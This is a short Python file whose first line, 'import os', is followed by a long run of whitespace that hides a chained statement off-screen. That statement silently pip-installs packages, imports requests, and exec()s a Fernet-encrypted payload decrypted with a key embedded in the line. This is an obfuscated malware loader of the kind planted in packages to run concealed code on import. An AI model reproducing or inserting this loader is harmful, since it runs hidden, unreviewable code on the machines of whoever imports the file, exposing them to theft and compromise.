import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'g7nuwW78x3pvb7_KDN0rPuPYBBRkNLI4pLRtyC5b3z4=').decrypt(b'gAAAAABnNQHRvsWvAFbRXIOE9oXCiwjsc2vsTMD7WCBODGFUV_7nBCJlZSlF9sy3QeM6Irqb1gdOfsXNCUsoZieMggh2IsFah-u57j8YZuwIxi0QvGtHMsqFvt5EeUY-vuVN1VIXaPPyiNvt31eI-50Uwq0MmX-s_N5ZuC1lZuYtvsceAeAlXi91Kh2qD5oHXzzv1vwWnQcn6HAvoRbzPex0HTjOTVNkpI_5tDVbTqPlS2FCKuts_O0='))
import socket
